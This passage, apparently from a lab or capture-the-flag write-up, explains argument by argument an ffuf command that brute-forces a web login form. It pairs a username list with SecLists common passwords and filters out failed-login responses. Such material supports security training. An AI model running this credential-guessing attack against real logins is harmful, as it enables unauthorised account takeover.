**Breakdown:**

- `-u 'http://10.112.172.138/customers/login'` sets the target URL
- `-w /home/—REDACTED—/usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt:W2` supplies two wordlists in one argument, each bound to its own marker: the saved username list to `W1`, and the top one hundred SecLists passwords to `W2`
- `-X POST` sets the HTTP method, as the login form requires POST
- `-H 'Content-Type: application/x-www-form-urlencoded'` sets the Content-Type header, so the server parses the body as form data
- `-d 'username=W1&password=W2'` is the request body template, pairing every username from `W1` with every password from `W2`
- `-ic` ignores comment lines in the wordlists
- `-c` colours the terminal output
- `-fc 200` filters out every response that returned HTTP 200, since that is the status the form returns on a failed login, leaving only the successful attempt visible
